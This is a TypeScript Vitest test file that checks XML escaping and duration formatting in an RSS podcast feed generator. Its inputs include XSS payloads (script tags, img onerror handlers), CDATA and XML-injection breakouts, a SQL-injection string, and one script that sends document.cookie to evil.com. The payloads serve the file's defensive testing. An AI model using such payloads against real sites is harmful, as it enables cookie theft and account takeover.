import { describe, it, expect, vi, beforeEach } from 'vitest';
import type { VercelRequest, VercelResponse } from '@vercel/node';

// We'll test the escapeXml function logic and RSS generation
describe('RSS Feed Generation - Security Tests', () => {
  describe('XML Entity Escaping (XSS Prevention)', () => {
    // Helper function matching the one in rss.ts
    function escapeXml(text: string): string {
      return text
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&apos;');
    }

    it('should escape ampersands', () => {
      expect(escapeXml('Tom & Jerry')).toBe('Tom &amp; Jerry');
      expect(escapeXml('A & B & C')).toBe('A &amp; B &amp; C');
    });

    it('should escape less-than signs', () => {
      expect(escapeXml('5 < 10')).toBe('5 &lt; 10');
      expect(escapeXml('<html>')).toBe('&lt;html&gt;');
    });

    it('should escape greater-than signs', () => {
      expect(escapeXml('10 > 5')).toBe('10 &gt; 5');
      expect(escapeXml('</html>')).toBe('&lt;/html&gt;');
    });

    it('should escape double quotes', () => {
      expect(escapeXml('Say "Hello"')).toBe('Say &quot;Hello&quot;');
    });

    it('should escape single quotes (apostrophes)', () => {
      expect(escapeXml("It's working")).toBe('It&apos;s working');
    });

    it('should prevent XSS via script tags', () => {
      const malicious = '<script>alert("XSS")</script>';
      const escaped = escapeXml(malicious);

      expect(escaped).toBe('&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;');
      expect(escaped).not.toContain('<script>');
      expect(escaped).not.toContain('</script>');
    });

    it('should prevent XSS via img tags with onerror', () => {
      const malicious = '<img src="x" onerror="alert(\'XSS\')">';
      const escaped = escapeXml(malicious);

      expect(escaped).not.toContain('<img');
      expect(escaped).toContain('&lt;img');
      expect(escaped).toContain('&gt;');
      // The word "onerror" may still be present, but it's harmless when < > are escaped
      expect(escaped).toContain('&quot;');
    });

    it('should prevent XSS via data attributes', () => {
      const malicious = '<div data-payload="<script>alert(1)</script>">Content</div>';
      const escaped = escapeXml(malicious);

      expect(escaped).not.toContain('<div');
      expect(escaped).not.toContain('<script>');
      expect(escaped).toContain('&lt;');
      expect(escaped).toContain('&gt;');
    });

    it('should escape all special characters in combination', () => {
      const input = 'A & B < C > D "E" \'F\'';
      const expected = 'A &amp; B &lt; C &gt; D &quot;E&quot; &apos;F&apos;';

      expect(escapeXml(input)).toBe(expected);
    });

    it('should handle empty strings', () => {
      expect(escapeXml('')).toBe('');
    });

    it('should handle strings without special characters', () => {
      const normal = 'This is a normal title';
      expect(escapeXml(normal)).toBe(normal);
    });

    it('should preserve French characters', () => {
      const french = 'Café français avec accents: àâäéèêëïîôùûüÿç';
      expect(escapeXml(french)).toBe(french);
    });

    it('should handle nested XML-like structures', () => {
      const nested = '<a href="<script>alert(1)</script>">Click</a>';
      const escaped = escapeXml(nested);

      expect(escaped).toBe(
        '&lt;a href=&quot;&lt;script&gt;alert(1)&lt;/script&gt;&quot;&gt;Click&lt;/a&gt;'
      );
    });

    it('should prevent CDATA injection', () => {
      const cdata = ']]><script>alert(1)</script><![CDATA[';
      const escaped = escapeXml(cdata);

      expect(escaped).not.toContain('<script>');
      expect(escaped).toContain('&lt;script&gt;');
    });

    it('should handle very long strings', () => {
      const longString = '<script>' + 'a'.repeat(10000) + '</script>';
      const escaped = escapeXml(longString);

      expect(escaped).toContain('&lt;script&gt;');
      expect(escaped).toContain('&lt;/script&gt;');
      expect(escaped.length).toBeGreaterThan(longString.length);
    });
  });

  describe('Duration Formatting', () => {
    // Helper function matching the one in rss.ts
    function formatDuration(seconds: number): string {
      const hours = Math.floor(seconds / 3600);
      const minutes = Math.floor((seconds % 3600) / 60);
      const secs = seconds % 60;
      return `${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
    }

    it('should format zero duration', () => {
      expect(formatDuration(0)).toBe('00:00:00');
    });

    it('should format seconds only', () => {
      expect(formatDuration(45)).toBe('00:00:45');
    });

    it('should format minutes and seconds', () => {
      expect(formatDuration(125)).toBe('00:02:05'); // 2 minutes, 5 seconds
    });

    it('should format hours, minutes, and seconds', () => {
      expect(formatDuration(3665)).toBe('01:01:05'); // 1 hour, 1 minute, 5 seconds
    });

    it('should pad single digits with zeros', () => {
      expect(formatDuration(3661)).toBe('01:01:01');
    });

    it('should handle long durations (2 hours)', () => {
      expect(formatDuration(7200)).toBe('02:00:00');
    });

    it('should handle maximum podcast duration', () => {
      expect(formatDuration(7199)).toBe('01:59:59'); // Just under 2 hours
    });

    it('should handle exactly 1 hour', () => {
      expect(formatDuration(3600)).toBe('01:00:00');
    });

    it('should handle exactly 1 minute', () => {
      expect(formatDuration(60)).toBe('00:01:00');
    });
  });

  describe('RSS Feed Structure Validation', () => {
    it('should escape podcast title in RSS output', () => {
      const escapeXml = (text: string): string => {
        return text
          .replace(/&/g, '&amp;')
          .replace(/</g, '&lt;')
          .replace(/>/g, '&gt;')
          .replace(/"/g, '&quot;')
          .replace(/'/g, '&apos;');
      };

      const title = 'Tech & AI News <Premium>';
      const escaped = escapeXml(title);

      const rssFragment = `<title>${escaped}</title>`;
      expect(rssFragment).toBe('<title>Tech &amp; AI News &lt;Premium&gt;</title>');
      // The escaped ampersand &amp; is safe in XML
      expect(rssFragment).not.toContain('<Premium>');
    });

    it('should escape podcast description', () => {
      const escapeXml = (text: string): string => {
        return text
          .replace(/&/g, '&amp;')
          .replace(/</g, '&lt;')
          .replace(/>/g, '&gt;')
          .replace(/"/g, '&quot;')
          .replace(/'/g, '&apos;');
      };

      const description = 'Articles about "AI" & <ML>';
      const escaped = escapeXml(description);

      expect(escaped).toBe('Articles about &quot;AI&quot; &amp; &lt;ML&gt;');
    });

    it('should escape article author names', () => {
      const escapeXml = (text: string): string => {
        return text
          .replace(/&/g, '&amp;')
          .replace(/</g, '&lt;')
          .replace(/>/g, '&gt;')
          .replace(/"/g, '&quot;')
          .replace(/'/g, '&apos;');
      };

      const author = "O'Reilly & Associates <Tech>";
      const escaped = escapeXml(author);

      expect(escaped).toBe('O&apos;Reilly &amp; Associates &lt;Tech&gt;');
    });

    it('should escape URLs in RSS', () => {
      const escapeXml = (text: string): string => {
        return text
          .replace(/&/g, '&amp;')
          .replace(/</g, '&lt;')
          .replace(/>/g, '&gt;')
          .replace(/"/g, '&quot;')
          .replace(/'/g, '&apos;');
      };

      const url = 'https://example.com/article?id=1&ref=twitter';
      const escaped = escapeXml(url);

      expect(escaped).toBe('https://example.com/article?id=1&amp;ref=twitter');
      // Query parameters should have & escaped
    });
  });

  describe('Real-world Attack Scenarios', () => {
    function escapeXml(text: string): string {
      return text
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&apos;');
    }

    it('should prevent podcast app XSS via malicious title', () => {
      const maliciousTitle = '<script>fetch("https://evil.com?cookie="+document.cookie)</script>';
      const escaped = escapeXml(maliciousTitle);

      expect(escaped).not.toContain('<script>');
      // The word "fetch" may still be present, but without executable context it's harmless
      expect(escaped).toContain('&lt;script&gt;');
      expect(escaped).toContain('&quot;');
    });

    it('should prevent XML injection in episode descriptions', () => {
      const maliciousDesc = ']]></description><script>alert(1)</script><description><![CDATA[';
      const escaped = escapeXml(maliciousDesc);

      expect(escaped).not.toContain('</description>');
      expect(escaped).not.toContain('<script>');
      expect(escaped).toContain('&lt;/description&gt;');
    });

    it('should handle SQL injection attempts in text fields', () => {
      // While not directly SQL-related, these characters should be escaped
      const sqlAttempt = "' OR '1'='1' --";
      const escaped = escapeXml(sqlAttempt);

      expect(escaped).toBe('&apos; OR &apos;1&apos;=&apos;1&apos; --');
    });

    it('should handle mixed content with multiple attack vectors', () => {
      const mixed = '<img src=x onerror="alert(1)"> & <script>evil()</script> "quoted"';
      const escaped = escapeXml(mixed);

      expect(escaped).not.toContain('<img');
      expect(escaped).not.toContain('<script>');
      // Words like "onerror" and "evil" may still be present, but they're harmless when escaped
      expect(escaped).toContain('&lt;');
      expect(escaped).toContain('&gt;');
      expect(escaped).toContain('&amp;');
      expect(escaped).toContain('&quot;');
    });

    it('should preserve legitimate ampersands in titles', () => {
      const title = 'Rock & Roll News';
      const escaped = escapeXml(title);

      expect(escaped).toBe('Rock &amp; Roll News');
      // Should be valid XML
    });

    it('should handle Unicode and emoji safely', () => {
      const unicode = 'Podcast 🎙️ Tech & AI 🤖';
      const escaped = escapeXml(unicode);

      expect(escaped).toContain('🎙️');
      expect(escaped).toContain('🤖');
      expect(escaped).toContain('&amp;');
    });
  });
});
